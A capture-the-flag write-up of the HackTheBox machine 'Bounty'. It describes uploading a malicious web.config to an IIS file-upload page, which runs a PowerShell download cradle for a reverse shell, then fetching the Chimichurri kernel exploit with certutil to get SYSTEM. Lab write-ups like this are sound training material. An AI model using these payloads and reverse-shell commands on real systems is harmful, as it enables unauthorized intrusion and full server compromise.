# HackTheBox
------------------------------------
### IP: 10.129.151.131
### Name: Easy
### Difficulty: Easy
--------------------------------------------

Bounty.png

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Bounty]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.129.151.131
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-29 06:53 CDT
Nmap scan report for 10.129.151.131
Host is up (0.071s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds
```

Looks like only port 80 HTTP is open for TCP. That's a bit odd because usually Windows boxes have a lot more services listening than that.

Looking at the webpage we find a jpeg of a wizard:

bounty_merlin.png

Starting some directory scanning we find a `/transfer.aspx` endpoint, as well as `/uploadedfiles`

Looking at `/transfer.aspx` we find a simple file upload:

bounty_transfer_page.png

Trying to access `/uploadedfiles` however we get access denied.

bounty_denied.png

Trying to upload a file called test.txt, we get this error: `Invalid File. Please try again`

Capturing the request in Burp and manually trying a few different file types, I fund we can successfully load a .doc file:

bounty_burp1.png

This also works for docx files too.

However I'm still unable to access these files from `/uploadedfiles` as we get a message saying file not found.

My first instinct is to use something like https://github.com/Greenwolf/ntlm_theft to create a malicious file to steal NTLM hashes as a client side attack, but I'm not sure there's any service on the other end that would 'open' the file. But more importantly, even if I did capture a hash, what would I do with it? So far in my enumeration there is nowhere to login and no other services running. 

Going back to Burp I notice we can also upload .config files. 

Lets try loading a malicious web.config file that will download and execute a powershell revers shell.

### Exploitation

I can grab the malicious web.config file from: https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config and we can adjust the powershell download cradle to our local IP:

```
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.114/Invoke-PowerShellTcp.ps1')")
%>
```

Then we'll transfer to our working directory a copy of Invoke-PowerShellTcp.ps1, and edit the last line :

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.114 -Port 443
```

Lets set up a python http.server and our listener and load the web.config file:

bounty_good.png

We can then call the script by navigating to: http://10.129.151.131/uploadedfiles/web.config

We can confirm that Invoke-PowerShellTcp.ps1 has been downloaded, and we catch a shell back as user merlin:

```
┌──(ryan㉿kali)-[~/HTB/Bounty]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.151.131 - - [29/Jun/2024 08:24:35] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

```
┌──(ryan㉿kali)-[~/HTB/Bounty]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.114] from (UNKNOWN) [10.129.151.131] 49160

Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>PS C:\windows\system32\inetsrv> whoami
bounty\merlin
PS C:\windows\system32\inetsrv> hostname
bounty
```

We can then find the user flag using `dir -Force`:

bounty_user_flag.png

### Privilege Escalation

Running `whoami -all` we see that SeImpersonatePrivileges is set.

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Normally finding this means an easy path to system via a Potato exploit or via PrintSpoofer, but for some reason I was never able to get those to work here, and I'm not entirely sure why.

Because I know this is an old box, I decided to run `systeminfo` to see what kind of patching is in place:

```
PS C:\users\merlin\desktop> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          6/29/2024, 2:49:50 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,401 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,170 MB
Virtual Memory: In Use:    925 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.151.131
                                 [02]: fe80::c0af:a074:2e2e:5b82
                                 [03]: dead:beef::c0af:a074:2e2e:5b82
```
We can see here we're on a Windows Server 2008 R2 and that no hotfixes have been made.

This is likely vulnerable to a kernel exploit based on the age of the box and the fact its not been patched. 

Lets use: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012/Chimichurri

We can set up a netcat listener and python server, transfer the exploit, and run it:

```
PS C:\users\merlin\desktop> certutil -urlcache -split -f "http://10.10.14.114/Chimichurri.exe"
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.
PS C:\users\merlin\desktop> ./Chimichurri.exe 10.10.14.114 445
```

This catches us a shell back as system:

```
┌──(ryan㉿kali)-[~/HTB/Bounty]
└─$ nc -lnvp 445            
listening on [any] 445 ...
connect to [10.10.14.114] from (UNKNOWN) [10.129.151.131] 49201
whoamMicrosoft Windows [Version 6.1.7600]i
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\users\merlin\desktop>
whoami
nt authority\system
```

And we can now grab the root.txt flag:

bounty_root_flag.png

Thanks for following along!

-Ryan

--------------------------------------------------